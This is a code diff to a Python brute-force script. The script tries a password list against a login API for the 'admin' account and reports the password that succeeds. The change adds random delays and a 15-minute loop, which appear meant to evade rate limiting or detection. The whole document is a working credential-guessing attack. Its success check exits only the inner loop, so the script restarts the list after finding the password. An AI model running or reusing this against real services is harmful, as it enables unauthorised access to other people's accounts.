@@ -1,15 +1,12 @@
 import requests
 import logging
 import wfuzz
+import time
+import random
 from consts import API_URL, STATIC_PATH, TARGET_URL
 
 
 logger = logging.getLogger(__name__)
-# handler = logging.FileHandler('requests.log')
-# handler.setLevel(logging.INFO)
-formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-# handler.setFormatter(formatter)
-# logger.addHandler(handler)
 
 
 def bruteforce_login(username: str = "admin") -> None:
@@ -24,14 +21,24 @@ def bruteforce_login(username: str = "admin") -> None:
         "username": username,
         "password": "<>"
     }
-    for n, passwd in enumerate(passwds):
-        logger.debug(f'Trying password {n + 1}/{len(passwds)}')
-        data['password'] = passwd
+    current_time = time.time()
+    while True:
+        for n, passwd in enumerate(passwds):
+            logger.debug(f'\rTrying password {n + 1}/{len(passwds)}')
+            data['password'] = passwd
 
-        r = requests.post(f'{API_URL}/login', headers=headers, json=data)
+            r = requests.post(f'{API_URL}/login', headers=headers, json=data)
 
-        if r.status_code == 200:
-            logger.info(f'Found password for Admin: {passwd}')
+            if r.status_code == 200:
+                logger.info(f'\nFound password for Admin: {passwd}')
+                break
+
+            time.sleep(random.randint(1, 10))
+
+            if time.time() > current_time + 15 * 60:
+                break
+
+        if time.time() > current_time + 15 * 60:
             break
 
 
